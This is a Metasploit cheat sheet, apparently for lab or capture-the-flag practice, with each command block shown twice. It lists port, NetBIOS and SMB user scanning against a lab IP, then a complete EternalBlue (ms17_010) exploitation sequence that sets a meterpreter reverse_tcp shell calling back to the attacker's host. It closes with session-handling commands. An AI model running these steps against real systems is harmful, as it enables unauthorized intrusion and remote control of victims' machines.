   

Metasploit

## 🚀 Metasploit Cheat Sheet

### 🔎 Scanning & Enumeration

# Search modules
search portscan
search netbios
search smb

# Use TCP port scanner
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.40.235
run

# Use NetBIOS name scanner
use auxiliary/scanner/netbios/nbname
set RHOSTS 10.10.40.235
run

# Enumerate SMB users
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS 10.10.40.235
run

```
# Search modules
search portscan
search netbios
search smb

# Use TCP port scanner
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.40.235
run

# Use NetBIOS name scanner
use auxiliary/scanner/netbios/nbname
set RHOSTS 10.10.40.235
run

# Enumerate SMB users
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS 10.10.40.235
run
```

---

### 💥 Exploitation

# Search exploit
search ms17_010

# Use EternalBlue exploit
use exploit/windows/smb/ms17_010_eternalblue

# Show compatible payloads
show payloads

# Select payload
set payload windows/x64/meterpreter/reverse_tcp

# Configure payload options
set LHOST <your IP>
set LPORT 4444

# Exploit
exploit

```
# Search exploit
search ms17_010

# Use EternalBlue exploit
use exploit/windows/smb/ms17_010_eternalblue

# Show compatible payloads
show payloads

# Select payload
set payload windows/x64/meterpreter/reverse_tcp

# Configure payload options
set LHOST <your IP>
set LPORT 4444

# Exploit
exploit
```

---

### 🖥 Session management

# List active sessions
sessions

# Interact with a session
sessions -i 1

# Background a session
CTRL+Z  (then confirm with y)

# Close session
sessions -k 1

```
# List active sessions
sessions

# Interact with a session
sessions -i 1

# Background a session
CTRL+Z  (then confirm with y)

# Close session
sessions -k 1
```

---

## 📝 Notes

✅ Always run `show options` after setting modules to verify required parameters.  
✅ Use `info <module>` to see detailed descriptions, targets, references, and usage notes.  
✅ For persistent shells, prefer `meterpreter` payloads.  
✅ Example common payloads:

- `windows/meterpreter/reverse_tcp`
    
- `generic/shell_reverse_tcp`
    

---